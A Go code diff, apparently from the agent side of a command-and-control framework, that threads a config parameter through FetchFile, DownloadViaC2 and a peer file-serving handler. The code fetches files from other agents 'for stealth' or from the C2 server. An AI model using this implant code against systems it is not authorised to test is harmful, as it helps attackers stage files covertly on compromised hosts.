@@ -27,7 +27,7 @@ import (
 // FetchFile download via grab, if path is empty, return []byte instead
 // This will try to download from other agents for better speed and stealth
 // when fail, will try to download from CC
-func FetchFile(download_addr, file_to_download, path, checksum string) (data []byte, err error) {
+func FetchFile(config *def.Config, download_addr, file_to_download, path, checksum string) (data []byte, err error) {
 	if util.IsFileExist(path) {
 		// check checksum
 		data, err = util.ReadFileAgent(path)
@@ -54,13 +54,13 @@ func FetchFile(download_addr, file_to_download, path, checksum string) (data []b
 		return nil, err
 	}
 
-	return DownloadViaC2(file_to_download, path, checksum)
+	return DownloadViaC2(config, file_to_download, path, checksum)
 }
 
 // DownloadViaC2 download via EmpHTTPClient
 // if path is empty, return []data instead
-func DownloadViaC2(file_to_download, path, checksum string) (data []byte, err error) {
-	downloadURL := netutil.JoinURL(def.CCAddress, transport.DownloadFile2AgentAPI, url.QueryEscape(common.RuntimeConfig.AgentUUID)) +
+func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) (data []byte, err error) {
+	downloadURL := netutil.JoinURL(def.CCAddress, transport.DownloadFile2AgentAPI, url.QueryEscape(config.AgentUUID)) +
 		"?file_to_download=" + url.QueryEscape(file_to_download)
 	logging.Printf("DownloadViaCC is downloading from %s", downloadURL)
 	retData := false
@@ -276,7 +276,7 @@ func handleClient(w http.ResponseWriter, r *http.Request) {
 	// if file does not exist, download it from CC
 	if !util.IsFileExist(safe_path) {
 		logging.Printf("handleClient: file %s (%s) does not exist, downloading from CC", safe_path, checksum)
-		_, err := DownloadViaC2(file_path, safe_path, checksum)
+		_, err := DownloadViaC2(common.RuntimeConfig, file_path, safe_path, checksum)
 		if err != nil {
 			logging.Printf("handleClient: failed to download file from CC: %v", err)
 			http.Error(w, "Failed to download file from CC", http.StatusInternalServerError)
